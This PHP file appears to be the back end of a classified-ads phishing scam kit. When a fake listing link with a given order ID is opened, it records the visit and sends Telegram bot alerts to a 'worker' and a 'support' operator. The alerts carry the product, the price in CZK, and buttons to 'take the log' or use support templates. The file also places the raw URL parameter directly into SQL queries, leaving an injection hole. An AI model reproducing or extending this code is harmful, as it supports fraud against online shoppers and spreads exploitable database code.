<?php

require_once __DIR__ . '/vendor/autoload.php';

$dotenv = Dotenv\Dotenv::createUnsafeImmutable(__DIR__);
$dotenv->load();

$dbhost = getenv('dbHost');
$dblogin = getenv('dbLogin');
$dbpass = getenv('dbPass');
$dbport = getenv('dbPort');

$dbconn = pg_connect("host={$dbhost} port={$dbport} dbname=link_infos user={$dblogin} password={$dbpass}");
$userdbconn = pg_connect("host={$dbhost} port={$dbport} dbname=user_infos user={$dblogin} password={$dbpass}");
if ($dbconn) {
    $id = $_GET['orderid'];
    $_SESSION['orderid'] = $id;
    ?>
          <?php
    $result = pg_query($dbconn, "SELECT * FROM link_infos WHERE orderid='$id'");
    if ($result) {
        $row = pg_fetch_array($result, null, PGSQL_ASSOC);
        if (!empty($row)) { 

            pg_query($dbconn, "UPDATE link_infos SET last_activity = TO_TIMESTAMP('" . date('Y-m-d H:i:s') . "', 'YYYY-MM-DD HH24:MI:SS') AT TIME ZONE 'Europe/Kyiv' WHERE orderid = '$id'");
            $productName = $row['productName'];
            $productPrice = $row['productPrice'];
            $sellerName = $row['profileName'];
            $sellerAddress = $row['profileAddress'];
            $photoUrl = $row['photoUrl'];
            $workerID = $row['workerID'];
            $linkID = $row['id'];
            $supportID = $row['supportID'];
            $supportUsername = $row['supportUsername'];
            $currService = $row['currService'];
            $currStageText;
            
            $user = pg_query($userdbconn, "SELECT * FROM user_infos WHERE \"chatID\"='$workerID'");
            if ($user) {
                $userrow = pg_fetch_array($user, null, PGSQL_ASSOC);
                if (!empty($userrow)) { 
                    $isSupportOn = $userrow['isSupportOn'];
                    $username = $userrow['workerusername'];
                }
            }
// Установить токен бота
$botToken = getenv('botKey');
// Текст сообщения
$message = '<b>' . $currService .'</b>'. PHP_EOL;
$message .= $currStageText . PHP_EOL;
$message .= '📠Название товара: <b>' . $productName . '</b>' . PHP_EOL;
$message .= '💴Цена: <b>' . $productPrice . ' CZK</b>' . PHP_EOL;
if ($supportUsername) {
    $message .= '👨🏻‍🚀ТП: <b>@' . $supportUsername . '</b>' . PHP_EOL;
}
$message .= '#search' . $linkID;
$keyboard = [
    "inline_keyboard" => [
        [
            ["text" => "👁", "callback_data" => "isOnlineButton_" . $id]
        ],
        [
            ["text" => "🗂Шаблоны ТП", "callback_data" => "supportTemplates_czech"]
        ]
    ]
];
// Кодируем клавиатуру в формат JSON
$encodedKeyboard = json_encode($keyboard);
// Опции запроса
$options = [
    "chat_id" => $workerID,
    "text" => $message,
    "reply_markup" => $encodedKeyboard,
    "parse_mode" => "HTML"
];
// URL для запроса
$url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?" . http_build_query($options);
// Отправляем запрос на API Telegram
$response = file_get_contents($url);

if ($isSupportOn === 't') {
    if ($supportID === null) {
    $message = '<b>' . $currService . '</b>'. PHP_EOL;
    $message .= $currStageText . PHP_EOL;
    $message .= '📠Название товара: <b>' . $productName . '</b>' . PHP_EOL;
    $message .= '💴Цена: <b>' . $productPrice . ' CZK</b>' . PHP_EOL;
    $message .= '👨🏻‍🏭Воркер: <b>@' . $username . '</b>' . PHP_EOL;
    $message .= '#search' . $linkID;
    $keyboard = [
        "inline_keyboard" => [
            [
                ["text" => "✅Взять лог", "callback_data" => "takeSupport_" . $id]
            ]
        ]
    ];
    // Кодируем клавиатуру в формат JSON
    $encodedKeyboard = json_encode($keyboard);
    // Опции запроса
    $options = [
        "chat_id" => getenv('supportChat'),
        "text" => $message,
        "reply_markup" => $encodedKeyboard,
        "parse_mode" => "HTML"
    ];
    // URL для запроса
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?" . http_build_query($options);
    // Отправляем запрос на API Telegram
    $response = file_get_contents($url);  
} else {
        $message = '<b>' . $currService . '</b>'. PHP_EOL;
        $message .= $currStageText . PHP_EOL;
        $message .= '📠Название товара: <b>' . $productName . '</b>' . PHP_EOL;
        $message .= '💴Цена: <b>' . $productPrice . ' CZK</b>' . PHP_EOL;
        $message .= '👨🏻‍🏭Воркер: <b>@' . $username . '</b>' . PHP_EOL;
        $message .= '👨🏻‍🚀Над логом работает: <b>@' . $supportUsername . '</b>' . PHP_EOL;
        $message .= '#search' . $linkID;
        $keyboard = [
            "inline_keyboard" => [
                    [
                        ["text" => "👁", "callback_data" => "isOnlineButton_" . $id]
                    ],
                    [
                        ["text" => "🗂Шаблоны ТП", "callback_data" => "supportTemplates_czech"]
                    ],
                    [
                        ["text" => "❌Отказаться", "callback_data" => "kickSupport_" . $id]
                    ]
            ]
        ];
        // Кодируем клавиатуру в формат JSON
        $encodedKeyboard = json_encode($keyboard);
        // Опции запроса
        $options = [
            "chat_id" => $supportID,
            "text" => $message,
            "reply_markup" => $encodedKeyboard,
            "parse_mode" => "HTML"
        ];
        // URL для запроса
        $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?" . http_build_query($options);
        // Отправляем запрос на API Telegram
        $response = file_get_contents($url);  
}
}


            ?>

                        <?php
        
        } else {
            echo "Запись в базе данных не найдена.";
        }
        } else {
        echo "Ошибка выполнения запроса к базе данных.";
        }
    } else {
    echo "Не указан идентификатор ссылки.";
}
            
?>